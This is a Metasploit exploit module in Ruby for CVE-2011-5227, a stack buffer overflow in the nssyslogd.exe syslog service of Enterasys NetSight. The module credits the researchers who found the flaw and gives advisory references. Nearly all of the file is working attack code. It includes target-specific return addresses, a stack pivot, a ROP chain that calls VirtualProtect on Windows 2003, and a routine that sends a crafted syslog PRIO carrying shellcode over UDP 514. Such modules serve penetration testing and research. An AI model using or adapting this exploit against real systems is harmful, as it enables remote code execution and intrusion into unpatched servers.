# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Udp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Enterasys NetSight nssyslogd.exe Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in Enterasys NetSight. The
                vulnerability exists in the Syslog service (nssylogd.exe) when parsing a specially
                crafted PRIO from a syslog message. The module has been tested successfully on
                Enterasys NetSight 4.0.1.34 over Windows XP SP3 and Windows 2003 SP2.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Jeremy Brown&#039;, # Vulnerability discovery
                    &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-5227&#039;],
                    [&#039;OSVDB&#039;, &#039;77971&#039;],
                    [&#039;BID&#039;, &#039;51124&#039;],
                    [&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-350/&#039;],
                    [&#039;URL&#039;, &#039;https://cp-enterasys.kb.net/article.aspx?article=14206&p=1&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00",
                    &#039;Space&#039; => 3000,
                    &#039;DisableNops&#039; => true,
                    &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [&#039;Enterasys NetSight 4.0.1.34 / Windows XP SP3&#039;,
                        {
                            &#039;Offset&#039; => 43,
                            &#039;Ret&#039; => 0x77c4e444 # ADD ESP,30 # POP EDX # RETN # from msvcrt
                        }
                    ],
                    [&#039;Enterasys NetSight 4.0.1.34 / Windows 2003 SP2&#039;,
                        {
                            &#039;Offset&#039; => 43,
                            &#039;Ret&#039; => 0x77bdf444 # ADD ESP,30 # POP EDX # RETN # from msvcrt
                        }
                    ]
                ],
            &#039;Privileged&#039;     => true,
            &#039;DisclosureDate&#039; => &#039;Dec 19 2011&#039;,
            &#039;DefaultTarget&#039;  => 1
            ))
 
        register_options([ Opt::RPORT(514) ], self.class)
    end
 
    def junk(n=4)
        return rand_text_alpha(n).unpack("V")[0].to_i
    end
 
    def nop
        return make_nops(4).unpack("V")[0].to_i
    end
 
    def get_stackpivot
        stack_pivot = &#039;&#039;
        case target.name
        when /Windows XP SP3/
            stack_pivot << [0x77c4e448].pack("V") #ret
            stack_pivot << [0x77c4e448].pack("V") #ret
            stack_pivot << [0x77c4e448].pack("V") #ret
            stack_pivot << [0x77c4e448].pack("V") #ret
            stack_pivot << [0x77c4e444].pack("V") # ADD ESP,30 # POP EDX # RETN
        when /Windows 2003 SP2/
            stack_pivot << [0x77bdf448].pack("V") #ret
            stack_pivot << [0x77bdf448].pack("V") #ret
            stack_pivot << [0x77bdf448].pack("V") #ret
            stack_pivot << [0x77bdf448].pack("V") #ret
            stack_pivot << [0x77bdf444].pack("V") # ADD ESP,30 # POP EDX # RETN
        end
        return stack_pivot
    end
 
    def get_payload
        my_payload = &#039;&#039;
 
        case target.name
        when /Windows XP SP3/
            jmp_esp = [0x77c35459].pack("V")
            my_payload << jmp_esp
        when /Windows 2003 SP2/
            rop_gadgets =
                [
                    0x77bb2563, # POP EAX # RETN
                    0x77ba1114, # <- *&VirtualProtect()
                    0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
                    junk,
                    0x77bb0c86, # XCHG EAX,ESI # RETN
                    0x77bc9801, # POP EBP # RETN
                    0x77be2265, # ptr to &#039;push esp #  ret&#039;
                    0x77bb2563, # POP EAX # RETN
                    #0x03C0990F,
                    0x03c09f0f,
                    0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0xb00 -> ebx)
                    0x77bb48d3, # POP EBX, RET
                    0x77bf21e0, # .data
                    0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
                    0x77bbfc02, # POP ECX # RETN
                    0x77bef001, # W pointer (lpOldProtect) (-> ecx)
                    0x77bd8c04, # POP EDI # RETN
                    0x77bd8c05, # ROP NOP (-> edi)
                    0x77bb2563, # POP EAX # RETN
                    0x03c0984f,
                    0x77bdd441, # SUB EAX, 03c0940f
                    0x77bb8285, # XCHG EAX,EDX # RETN
                    0x77bb2563, # POP EAX # RETN
                    nop,
                    0x77be6591, # PUSHAD # ADD AL,0EF # RETN
                ].pack("V*")
            my_payload << rop_gadgets
        end
 
        my_payload << payload.encoded
        return my_payload
    end
 
    def exploit
        connect_udp
 
        prio = "<"
        prio << rand_text_alpha(19)
        prio << get_stackpivot
        prio << rand_text_alpha(4)
        prio << [target.ret].pack("V")
        prio << ">"
 
        message = prio
        message << rand_text_alpha(9 + (15 - Rex::Socket.source_address(datastore[&#039;RHOST&#039;]).length)) # Allow to handle the variable offset due to the source ip length
        message << get_payload
 
        print_status("#{rhost}:#{rport} - Trying to exploit #{target.name}...")
        udp_sock.put(message)
 
        disconnect_udp
    end
 
end

